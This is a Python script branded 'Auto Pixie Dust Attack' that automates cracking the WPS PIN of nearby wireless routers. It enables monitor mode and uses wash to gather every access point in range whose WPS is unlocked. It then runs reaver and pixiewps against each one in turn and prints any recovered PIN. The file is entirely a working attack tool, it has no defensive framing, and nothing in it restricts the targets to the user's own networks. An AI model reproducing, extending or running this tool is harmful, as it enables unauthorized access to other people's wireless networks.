#!/usr/bin/python3

#imports
import os
import time
import subprocess
import time
import json
import threading
from shutil import which

#colors for unix systems
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RED   = "\033[1;31m"
    BLUE  = "\033[1;34m"
    CYAN  = "\033[1;36m"
    GREEN = "\033[0;32m"
    RESET = "\033[0;0m"
    REVERSE = "\033[;7m"
    LIGHTGREY='\033[37m'
    ORANGE='\033[33m'

class Process :
    def __init__(self, bssid, channel, essid, monCard) :
        self.bssid = bssid
        self.channel = channel
        self.essid = essid
        self.monCard = monCard
        self.reaver = None

    def run(self, timeout) :
        def target() :
            try :
                self.reaver = subprocess.Popen(['reaver', '-i', self.monCard, '-b', self.bssid, '-vv', '-S', '-c', str(self.channel), '-K'], shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                for line in self.reaver.stdout :
                    line = line.decode('utf-8')
                    if '[!] WARNING: 10 failed connections in a row' in line :
                        print(f'    {bcolors.BOLD}[ {bcolors.RED}!{bcolors.ORANGE} ] {self.essid} seems unresponsive, switching to next target{bcolors.RESET}{bcolors.ORANGE}')
                        raise KeyboardInterrupt
                    if 'WPS pin not found!' in line :
                        print(f'    [ {bcolors.GREEN}i{bcolors.ORANGE} ] {self.essid} seems not vulnarble, retrying with force option')
                    if 'WPS pin:' in line :
                        print(line)
                    if 'executing pixiewps' in line :
                        self.reaver.kill()
                        line = line.split('-')
                        e = line[1][2:-1]
                        s = line[2][2:-1]
                        z = line[3][2:-1]
                        a = line[4][2:-1]
                        n = line[5][2:-1]
                        pixie = subprocess.Popen(['pixiewps', '-e', e, '-s', s, '-z', z, '-a', a, '-n', n, '-S', '-f'], shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        for line in pixie.stdout :
                            line = line.decode('utf-8')
                            if 'WPS pin not found!' in line :
                                print(f'    [ {bcolors.GREEN}i{bcolors.ORANGE} ] {self.essid} is not vulnarble, switching to next target')
                            if 'WPS pin:' in line :
                                print(line)
            except :
                try :
                    self.reaver.kill()
                except:
                    pass
        thread = threading.Thread(target=target)
        thread.start()
        thread.join(timeout)
        if thread.is_alive() :
            print(f'    [ {bcolors.GREEN}i{bcolors.ORANGE} ] TIMEOUT, switching to next target')
            self.reaver.kill()
            thread.join()

def print_logo() :
    os.system('clear')
    print(f"""{bcolors.GREEN}
             █████╗ ██╗   ██╗████████╗ ██████╗     ██████╗ ██╗██╗  ██╗██╗███████╗
            ██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗    ██╔══██╗██║╚██╗██╔╝██║██╔════╝
            ███████║██║   ██║   ██║   ██║   ██║    ██████╔╝██║ ╚███╔╝ ██║█████╗
            ██╔══██║██║   ██║   ██║   ██║   ██║    ██╔═══╝ ██║ ██╔██╗ ██║██╔══╝
            ██║  ██║╚██████╔╝   ██║   ╚██████╔╝    ██║     ██║██╔╝ ██╗██║███████╗
            ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝

    ██████╗ ██╗   ██╗███████╗████████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
    ██╔══██╗██║   ██║██╔════╝╚══██╔══╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
    ██║  ██║██║   ██║███████╗   ██║       ███████║   ██║      ██║   ███████║██║     █████╔╝
    ██║  ██║██║   ██║╚════██║   ██║       ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗
    ██████╔╝╚██████╔╝███████║   ██║       ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
    ╚═════╝  ╚═════╝ ╚══════╝   ╚═╝       ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝{bcolors.LIGHTGREY}

                                                [ 1.0 ] Developed by JuneDay#0001{bcolors.ORANGE}

    """)

def check_soft() :
    reaver = which('reaver')
    pixiewps = which('pixiewps')
    wash = which('wash')
    if reaver is None :
        print(f'{bcolors.BOLD}[ {bcolors.RED}!{bcolors.ORANGE} ] Reaver is not installed{bcolors.RESET}{bcolors.ORANGE}')
    if pixiewps is None :
        print(f'{bcolors.BOLD}[ {bcolors.RED}!{bcolors.ORANGE} ] Pixiewps is not installed{bcolors.RESET}{bcolors.ORANGE}')
    if wash is None :
        print(f'{bcolors.BOLD}[ {bcolors.RED}!{bcolors.ORANGE} ] Wash is not installed{bcolors.RESET}{bcolors.ORANGE}')
    if wash is None or pixiewps is None or reaver is None :
        os._exit(1)

def startMonitor() :
    print(str(bcolors.ORANGE))
    FNULL = open(os.devnull, 'w')
    cards = []
    index = 1
    iwconfig = subprocess.Popen('iwconfig', shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    for line in iwconfig.stdout:
        line = line.decode('utf-8')
        if "IEEE" in line:
            cards.append(line.split(' ')[0])
    print(f'[ {bcolors.GREEN}SETUP{bcolors.ORANGE} ] Please choose the wireless card to use by its index: ')
    for card in cards :
        print(f'    [ {bcolors.GREEN}{index}{bcolors.ORANGE} ] {card}')
        index += 1
    toMon = cards[int(input('\n> ')) - 1]
    print(f'\n[ {bcolors.GREEN}i{bcolors.ORANGE} ] Starting monitor mode on {toMon}')
    airmonng = subprocess.Popen(['airmon-ng', 'start', toMon], shell=False, stdout=FNULL)
    time.sleep(1)
    newCards = []
    iwconfig = subprocess.Popen('iwconfig', shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    for line in iwconfig.stdout:
        line = line.decode('utf-8')
        if "IEEE" in line:
            newCards.append(line.split(' ')[0])

    for card in newCards :
        if card not in cards :
            print_logo()
            print(f'[ {bcolors.GREEN}i{bcolors.ORANGE} ] Monitor mode started on {toMon} as {card}')
            return card
    print(f'{bcolors.BOLD}[ {bcolors.RED}!{bcolors.ORANGE} ] Unable to start monitor mode on {toMon}, exiting ...')
    os._exit(1)

def stopMonitor(monCard) :
    print(f'\n[ {bcolors.GREEN}i{bcolors.ORANGE} ] Stoping monitor mode on {monCard}')
    FNULL = open(os.devnull, 'w')
    cards = []
    airmonng = subprocess.Popen(['airmon-ng', 'stop', monCard], shell=False, stdout=FNULL)
    time.sleep(1)
    iwconfig = subprocess.Popen('iwconfig', shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    for line in iwconfig.stdout:
        line = line.decode('utf-8')
        if "IEEE" in line:
            cards.append(line.split(' ')[0])
    if monCard in cards :
        print(f'{bcolors.BOLD}[ {bcolors.RED}!{bcolors.ORANGE} ] Unable to stop monitor mode on {monCard}, exiting ...')
        os._exit(1)
    else :
        print(f'[ {bcolors.GREEN}i{bcolors.ORANGE} ] Monitor mode stoped on {monCard}')
        os._exit(0)

def getBssids(monCard) :
    FNULL = open(os.devnull, 'w')
    aps = []
    ipup = subprocess.Popen(['ip', 'link', 'set', monCard, 'up'], shell=False, stdout=FNULL)
    print(f'\n[ {bcolors.GREEN}i{bcolors.ORANGE} ] Gavering APs bssid, press CTRL+C to stop ...')
    wash = subprocess.Popen(['wash', '-i', monCard, '-j'], shell=False, stdout=subprocess.PIPE)
    try :
        for line in wash.stdout :
            line = json.loads(line.decode('utf-8'))
            if line['wps_locked'] == 2 :
                print(f'    [+] BSSID : {line["bssid"]} | PWR : {line["rssi"]} | CHANNEL : {line["channel"]} | ESSID : {line["essid"]}')
                aps.append(line)
    except KeyboardInterrupt:
        wash.kill()
    print_logo()
    print(f'\n[ {bcolors.GREEN}i{bcolors.ORANGE} ] {len(aps)} AP found, starting AUTO pixie dust attack')
    return aps

def attack(monCard, ap) :
    bssid = ap['bssid']
    channel = ap['channel']
    essid = ap['essid']
    process = Process(bssid, channel, essid, monCard)
    process.run(300)


print_logo()
check_soft()
monCard = startMonitor()
aps = getBssids(monCard)
index = 1
for ap in aps :
    print(f'\n[ {index}/{len(aps)} ] Attack on {ap["essid"]}')
    try :
        attack(monCard, ap)
    except KeyboardInterrupt:
        pass
    index += 1
stopMonitor(monCard)
